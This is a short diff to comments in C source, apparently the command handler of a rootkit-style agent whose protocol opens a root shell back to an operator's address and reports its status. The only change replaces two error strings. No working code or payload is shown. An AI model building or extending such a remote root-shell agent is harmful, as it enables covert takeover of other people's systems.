@@ -80,7 +80,7 @@ static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
 	// RK_COMMAND_SHELL: call rk_root_shell_request() with the operator's
 	//   address (agent->peer.sin_addr.s_addr) and command.shell_port.
 	//   On success, reply "OPEN %08x %016llx" with request_id and cookie.
-	//   On -EBUSY, reply "ERR busy". Otherwise reply "ERR shell".
+	//   On -EBUSY, reply "ERR 4". Otherwise reply "ERR 5".
 	// RK_COMMAND_SHELL_STATUS: call rk_root_shell_snapshot(), reply
 	//   "STATE %08x %s %d" with request_id, state name, and result.
 	// RK_COMMAND_QUIT: set *close_session = true, return 0.
